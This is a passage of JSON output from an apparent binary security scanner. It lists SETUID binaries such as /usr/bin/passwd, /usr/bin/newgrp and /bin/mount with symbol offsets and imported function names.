                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af98",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afa0",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afa8",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afb0",
                        "execl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afb8",
                        "crypt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afc0",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000afe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000b5e0",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000b600",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x000032d0",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00003370",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec18",
                        "utime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec20",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec28",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec30",
                        "is_selinux_enabled",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec38",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec40",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec48",
                        "pam_start",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec50",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec58",
                        "unlink",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec60",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec68",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec70",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec78",
                        "chroot",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec80",
                        "sgetspent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec88",
                        "putspent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec90",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ec98",
                        "lckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eca0",
                        "qsort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eca8",
                        "selinux_check_access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecb0",
                        "fcntl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecb8",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecc0",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecc8",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecd0",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecd8",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ece0",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ece8",
                        "pam_chauthtok",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecf0",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ecf8",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed00",
                        "__lxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed08",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed10",
                        "pam_end",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed18",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed20",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed28",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed30",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed38",
                        "pam_strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed40",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed48",
                        "snprintf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed50",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed58",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed60",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed68",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed70",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed78",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed80",
                        "selinux_set_callback",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed88",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed90",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ed98",
                        "matchpathcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eda0",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eda8",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edb0",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edb8",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edc0",
                        "execve",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edc8",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edd0",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edd8",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ede0",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ede8",
                        "strtoll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edf0",
                        "setpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000edf8",
                        "__memcpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee00",
                        "getprevcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee08",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee10",
                        "umask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee18",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee20",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee28",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee30",
                        "getpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee38",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee40",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee48",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee50",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee58",
                        "setfscreatecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee60",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee68",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee70",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee78",
                        "__fxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee80",
                        "endpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee88",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee90",
                        "fseek",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ee98",
                        "security_getenforce",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eea0",
                        "__fgets_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eea8",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eeb0",
                        "setrlimit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eeb8",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eec0",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eec8",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eed0",
                        "fdopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eed8",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eee0",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eee8",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eef0",
                        "fchmod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eef8",
                        "strftime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef00",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef08",
                        "fsync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef10",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef18",
                        "getspnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef20",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef28",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef30",
                        "fchown",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef38",
                        "audit_log_user_avc_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef40",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef48",
                        "ulckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef50",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef58",
                        "rename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef60",
                        "gmtime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef68",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef70",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef78",
                        "freecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef80",
                        "link",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef88",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef90",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000ef98",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efa0",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efa8",
                        "putpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efb0",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efb8",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efc0",
                        "getc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000efe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000eff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000f2b0",
                        "misc_conv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000f748",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000f750",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000fc08",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x0000fc10",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010160",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010170",
                        "stdin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010178",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010180",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x00010188",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/passwd",
                        "0x000101a0",
                        "stderr",
                        "SETUID binaries were found"
                     ]
                  ]
               }
            ],
            "info": "SETUID binaries were found",
            "details": [
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db40, Symbol: mnt_table_set_parser_errcb, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db48, Symbol: mnt_context_get_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db50, Symbol: mnt_fs_get_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db58, Symbol: mnt_context_set_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db60, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db68, Symbol: mnt_context_is_restricted, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db70, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db78, Symbol: mnt_unref_table, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db80, Symbol: mnt_fs_get_fstype, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db88, Symbol: mnt_context_mount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db90, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000db98, Symbol: mnt_context_helper_executed, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dba0, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dba8, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbb0, Symbol: _exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbb8, Symbol: secure_getenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbc0, Symbol: mnt_fs_set_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbc8, Symbol: mnt_context_enable_fake, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbd0, Symbol: warn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbd8, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbe0, Symbol: mnt_context_set_fstype, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbe8, Symbol: mnt_context_is_fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbf0, Symbol: strtod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dbf8, Symbol: mnt_table_next_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc00, Symbol: localeconv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc08, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc10, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc18, Symbol: mnt_new_iter, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc20, Symbol: mnt_context_get_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc28, Symbol: mnt_context_set_target_prefix, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc30, Symbol: mnt_context_disable_swapmatch, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc38, Symbol: __strtol_internal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc40, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc48, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc50, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc58, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc60, Symbol: mnt_get_library_features, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc68, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc70, Symbol: mnt_cache_find_tag_value, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc78, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc80, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc88, Symbol: errx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc90, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dc98, Symbol: warnx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dca0, Symbol: mnt_context_force_unrestricted, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dca8, Symbol: nanosleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcb0, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcb8, Symbol: mnt_new_table, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcc0, Symbol: mnt_context_next_mount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcc8, Symbol: mnt_optstr_remove_option, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcd0, Symbol: dup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcd8, Symbol: mnt_context_enable_rwonly_mount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dce0, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dce8, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcf0, Symbol: __strtoul_internal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dcf8, Symbol: mnt_context_wait_for_children, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd00, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd08, Symbol: mnt_context_disable_helpers, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd10, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd18, Symbol: getcwd, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd20, Symbol: mnt_context_get_options, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd28, Symbol: fgetc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd30, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd38, Symbol: mnt_context_set_tables_errcb, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd40, Symbol: pipe, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd48, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd50, Symbol: mnt_new_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd58, Symbol: mnt_context_next_remount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd60, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd68, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd70, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd78, Symbol: strndup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd80, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd88, Symbol: mnt_fs_get_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd90, Symbol: mnt_match_fstype, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dd98, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dda0, Symbol: mnt_context_set_fstab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dda8, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddb0, Symbol: mnt_fs_get_srcpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddb8, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
